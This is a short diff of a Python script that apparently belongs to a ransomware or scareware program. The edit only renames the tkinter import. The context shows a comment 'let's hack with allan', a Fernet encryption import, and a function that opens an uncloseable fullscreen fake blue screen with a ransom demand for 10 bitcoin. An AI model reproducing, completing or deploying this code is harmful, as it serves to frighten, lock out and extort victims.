@@ -2,14 +2,14 @@
 import os
 from cryptography.fernet import Fernet
 #let's hack with allan
-import tkinter as tk
+import tkinter
 
 def fake_blue_screen():
-    root = tk.Tk()
+    root = tkinter.Tk()
     root.attributes("-fullscreen", True)
     root.configure(background='blue')
 
-    label = tk.Label(root, text="Allan has hacked your syste, give me 10 bitcoin.", fg="white", bg="blue", font=("Helvetica", 16))
+    label = tkinter.Label(root, text="Allan has hacked your syste, give me 10 bitcoin.", fg="white", bg="blue", font=("Helvetica", 16))
     label.pack(expand=True)
 
     # Disable the ability to close the window
